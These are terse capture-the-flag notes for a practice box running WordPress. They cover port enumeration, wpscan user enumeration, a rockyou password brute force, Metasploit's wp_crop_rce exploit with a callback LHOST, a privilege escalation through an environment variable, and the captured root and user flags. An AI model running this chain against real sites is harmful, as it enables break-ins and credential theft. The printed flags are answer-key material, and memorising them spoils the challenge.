<pre>
Enum
    Open ports:
        22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
        80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
        139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu 


80 http port:
    WordPress site!
    Lets enumerate users with wpscan
        wpscan --url http://blog.thm/ --enumerate u
            users:
            kwheel
            bjoel
            Karen Wheeler
            Billy Joel
            
    Lets brute force users for passwords
        wpscan --url http://blog.thm/ --passwords rockyou.txt
            Passwords:
                kwhell:cutiepie1
                

Exploit exploit/multi/http/wp_crop_rce
$ use exploit/multi/http/wp_crop_rce
    set RHOSTS blog.thm
    set USERNAME kwheel
    set PASSWORD cutiepie1
    set LHOST 10.8.129.79
        Exploit!

And we get www-data

Lets priv esv:
    $ export admin=/root
    $ checker
        We got root!

    

Root Flag: 9a0b2b618bef9bfa7ac28c1353d9f318
User Flag: c8421899aae571f7af486492b71a8ab7
        

</pre>
